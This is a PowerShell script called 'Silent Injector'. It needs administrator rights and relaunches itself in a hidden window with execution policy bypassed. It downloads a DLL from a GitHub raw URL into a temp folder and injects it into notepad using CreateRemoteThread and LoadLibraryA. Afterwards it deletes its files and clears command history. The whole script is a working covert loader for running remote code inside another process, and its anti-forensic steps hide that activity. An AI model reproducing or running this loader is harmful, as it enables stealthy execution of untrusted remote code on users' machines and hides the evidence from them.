#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Silent Injector - Hides itself and runs in background
#>

param(
    [string]$Url = "https://github.com/patzagon2-beep/highm/raw/main/Booga1.dll",
    [string]$Process = "notepad",
    [switch]$Hidden
)

# If not running hidden, restart with hidden window
if (-not $Hidden) {
    $scriptPath = $MyInvocation.MyCommand.Path
    
    # Start hidden PowerShell
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$scriptPath`" -Url `"$Url`" -Process `"$Process`" -Hidden" -WindowStyle Hidden
    
    exit
}

# ========================================
# Hidden execution (no window)
# ========================================

Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'

# Download
$tmp = "$env:TEMP\$([guid]::NewGuid())"
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$dll = "$tmp\booga.dll"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
(New-Object Net.WebClient).DownloadFile($Url, $dll)

# Find/Start process
$targetProc = Get-Process -Name $Process -ErrorAction SilentlyContinue | Select-Object -First 1
if (!$targetProc) {
    if ($Process -eq "notepad") {
        Start-Process "C:\Windows\System32\notepad.exe"
    } else {
        Start-Process $Process
    }
    Start-Sleep 2
    $targetProc = Get-Process -Name $Process | Select-Object -First 1
}

$processId = $targetProc.Id

# Inject
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint a,bool b,int c);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr p,IntPtr a,uint s,uint t,uint x);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr p,IntPtr a,byte[] b,uint s,out int w);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr p,IntPtr a,uint s,IntPtr f,IntPtr x,uint c,IntPtr t);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h,string n);
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
}
"@

$h = [K]::OpenProcess(0x1F0FFF,$false,$processId)
$k = [K]::GetModuleHandle("kernel32.dll")
$l = [K]::GetProcAddress($k,"LoadLibraryA")
$b = [Text.Encoding]::ASCII.GetBytes($dll+"`0")
$m = [K]::VirtualAllocEx($h,[IntPtr]::Zero,$b.Length,0x1000,0x04)
$w = 0
[K]::WriteProcessMemory($h,$m,$b,$b.Length,[ref]$w) | Out-Null
$t = [K]::CreateRemoteThread($h,[IntPtr]::Zero,0,$l,$m,0,[IntPtr]::Zero)

# Cleanup
Remove-Item $tmp -Recurse -Force
Clear-History

exit
